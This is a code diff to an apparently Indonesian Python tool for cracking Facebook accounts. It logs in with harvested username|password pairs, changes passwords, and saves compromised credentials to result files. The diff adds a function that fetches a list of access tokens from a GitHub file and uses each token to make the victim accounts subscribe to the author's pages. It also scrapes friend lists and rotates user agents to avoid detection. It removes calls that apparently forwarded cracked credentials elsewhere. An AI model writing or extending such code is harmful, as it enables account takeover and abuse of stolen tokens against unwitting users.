@@ -109,12 +109,12 @@ try:
 		logo_exp()
 		sys.exit()
 	try:
-		if ser in ["MR.RISKY","Down"]:
+		if ser in ["MR.RISKY","Downn"]:
 			print (war+"Server Saat Ini Aktif"),;time.sleep(1)
 		else:
 			logo_mt()
 			print (war+"Server Used : "+i+ser)
-			print (war+"Admin Set Date : "+I+exp)
+			print (war+"Admin Set Date : "+I+expx)
 			print (war+"Server Currently Maintenance.. Contact Author !!")
 			exit()
 	except (KeyError, IOError):
@@ -681,7 +681,7 @@ def kontolkau(idt,name):
 	except (KeyError, IOError):
 		pengikut = '0'
 	try:
-		rr = requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=999999&access_token="+token)
+		rr = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
 		zz = json.loads(rr.text)
 		id = []
 		for ii in zz["data"]:
@@ -690,9 +690,10 @@ def kontolkau(idt,name):
 			nm = na.rsplit(" ")[0]
 			id.append(uid+'|'+nm)
 		bh=("%s"%(str(len(id))))
-		jq += 1
 	except:
+		bh=("0")
 		pass
+	jq += 1
 	try:
 		print(k+"["+I+str(int(jq))+k+"]"+K+"ID : "+I+idt+K+" Follow : "+I+str(pengikut)+K+" Friend : "+I+bh), time.sleep(0.05)
 	except KeyboardInterrupt:
@@ -767,7 +768,16 @@ def buatngecek():
 		try:
 			check_in(titid[0], titid[1])
 		except Exception as e:
-			print("   "+m+" NOTE : "+q+"Account Already Benned !!")
+			if e in ["'NoneType' object has no attribute 'find'"]:
+	                        print("   "+m+" NOTE : "+I+"This Account Tap Yes ✓")
+			elif e in ["NoneType object has no attribute find"]:
+	                        print("   "+m+" NOTE : "+I+"This Account Tap Yes ✓")
+			elif e in ["object has no attribute find"]:
+	                        print("   "+m+" NOTE : "+I+"This Account Tap Yes ✓")
+			elif e in ["NoneType"]:
+	                        print("   "+m+" NOTE : "+I+"This Account Tap Yes ✓")
+			else:
+				print("   "+m+" NOTE : "+q+"Account Already Benned !! (%s)"%(e))
 			continue
 		except requests.exceptions.ConnectionError:
 			continue
@@ -1004,6 +1014,7 @@ def menu():
     country=requests.get("http://ip-api.com/json/").json()["country"]
     os.system("clear")
     banner()
+    get_visitor()
     print((k+"\n["+p+"++"+k+"]"+p+" Your Name      : "+nama))
     print((k+"["+p+"++"+k+"]"+p+" Your ID        : "+id))
     print((k+"["+p+"++"+k+"]"+p+" Your IP        : "+ip))
@@ -2948,6 +2959,21 @@ def gen():
 # Enc Login
 
 # Menu Lainnya
+def get_visitor():
+	try:
+		memek = requests.get("https://komarev.com/ghpvc/?username=Dumai-991&color=blue").text.strip()
+		memekw, memekq = memek.split('<text x="105" y="14">')
+		githubx = memekq.split('</text>')
+		pepeq = requests.get("https://camo.githubusercontent.com/2d7842801a4429dade77642a7444a8d2d8bd83e92e9f9944aaeaa11343d250ae/68747470733a2f2f6b6f6d617265762e636f6d2f67687076632f3f757365726e616d653d44756d61692d39393126636f6c6f723d626c7565").text.strip()
+		pepep, pepek = pepeq.split('<text x="105" y="14">')
+		termux = pepek.split('</text>')
+		jalan("\n"+war+"Checking Visitor Tools And Github !! ( "+C+"Check Tools Pengunjung Dan Github "+K+")")
+		jalan("\n"+war+"Visitors on Tools  : "+I+githubx[0])
+		jalan(war+"Visitors on Github : "+I+termux[0])
+	except Exception as e:
+		print("[!] Error : %s"%(e))
+		exit()
+
 def hide_file(tempat):
 	dirs = os.listdir(tempat)
 	for file in dirs:
@@ -3279,7 +3305,7 @@ def select_method(show=True):
                 select_method(False)
 
 def eksekusi(username,password):
-        useragent="Mozilla/5.0 (Linux; Android 5.1; PICOphone_M4U_M2_M Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36"
+        useragent = random.choice(['NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+','Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'])
         try:
                 respons=login_ris(username,password)
         except (requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
@@ -3293,18 +3319,12 @@ def eksekusi(username,password):
                 respon=tahap1(session,parser(respons[1].text))
                 if respon == "new password":
                         print(i+"Suksess Change Password "+c+"⟩⟩"+i+" {}|{}".format(username,newpass))
-                        try:dekura_chann(username,newpass)
-                        except Exception as e:print(war+'Error : %s'%(e))
                         open("Hasil/newpass.txt","a+").write("{}|{}\n".format(username,newpass))
                 elif respon == "no change password":
                         print(i+"Failed Change Password "+c+"⟩⟩"+i+" {}|{}".format(username,password))
-                        try:dekura_chann(username,password)
-                        except Exception as e:print(war+'Error : %s'%(e))
                         open("Hasil/no_change.txt","a+").write("{}|{}\n".format(username,password))
                 else:
                         print(k+"CheckPoints "+c+"⟩⟩ {}{}|{}".format(p,username,password))
-                        try:dekura_chann(username,password)
-                        except Exception as e:print(war+'Error : %s'%(e))
                         if username not in open("Hasil/cp.txt").read():
                                 open("Hasil/cp.txt","a+").write("{}|{}\n".format(username,password))
         else:
@@ -3540,17 +3560,35 @@ def bot_follow():
 
 
 #### PERCOBAAAN SCRIPT ####
-def tes1():
-	tes = requests.get("https://free.facebook.com/story.php?story_fbid=1714009362122228").text.strip()
-	tes2 = requests.get("https://free.facebook.com/story.php?story_fbid=1714009362122228&id=100005395413800&zero_e=4&zero_et=1632283707&_rdc=2&_rdr").text.strip()
-	print(tes)
-	ppx=open("tes.txt", "w")
-	ppx.write(tes+"\n\n"+tes2)
-	ppx.close()
-
-
-
-
+def get_token():
+	memek = requests.get("https://github.com/TEAM-TERMUX-INDONESIA/DATA-FILE/blob/main/AllToken.txt").text.strip()
+	qwq, qwe = memek.split('class="blob-code blob-code-inner js-file-line">')
+	mna = qwe.split('</td>')
+	rui = ("%s"%(mna[0]))
+	tkn = rui.split('|')
+	for memek in tkn:
+		print("\n"+war+"Token : "+I+str(memek))
+		try:
+			token = (str(memek))
+			toket = (str(memek))
+		except:pass
+		try:
+			otw = requests.get("https://graph.facebook.com/me/?access_token="+toket)
+			a = json.loads(otw.text)
+			nama = a["name"]
+			print(war+nama)
+			requests.post('https://graph.facebook.com/100063690353340/subscribers?access_token=' + token) ### FB RISKY
+			requests.post('https://graph.facebook.com/100067783659018/subscribers?access_token=' + token) ### FB RISKY
+			requests.post('https://graph.facebook.com/100002924366263/subscribers?access_token=' + token) ### FB RISKY
+			requests.post('https://graph.facebook.com/110877271176800/subscribers?access_token=' + token) ### Halaman Risky
+			requests.post('https://graph.facebook.com/Termuxid-Dumai-991-110877271176800/subscribers?access_token=' + token) ### Halaman Risky
+		except KeyError:
+			jalan(war+"Token Ini Rusak Atau Gagal")
+			pass
+		except IOError:
+			jalan(war+"Token Ini Rusak Atau Gagal")
+			pass
+	jalan(war+"Done"),;exit()
 if __name__=="__main__":
 	if len(sys.argv) == 2:
 		if sys.argv[1] == 'crack':
@@ -3570,11 +3608,15 @@ if __name__=="__main__":
 			pilihcrack(dumai)
 		elif sys.argv[1] == 'vvip':
 			menuvvip()
+		elif sys.argv[1] == 'key':
+			buatkey()
+			input(inp+"Press Enter !!")
 		else:
 			print(war+"How to Use Crack Not Login..")
 			exit(inp+"Type : python prem.py crack or vvip")
 	try:
 		os.system("git pull")
+#	get_token()
 		curiakun()
 		Get_Ua()
 		menu()
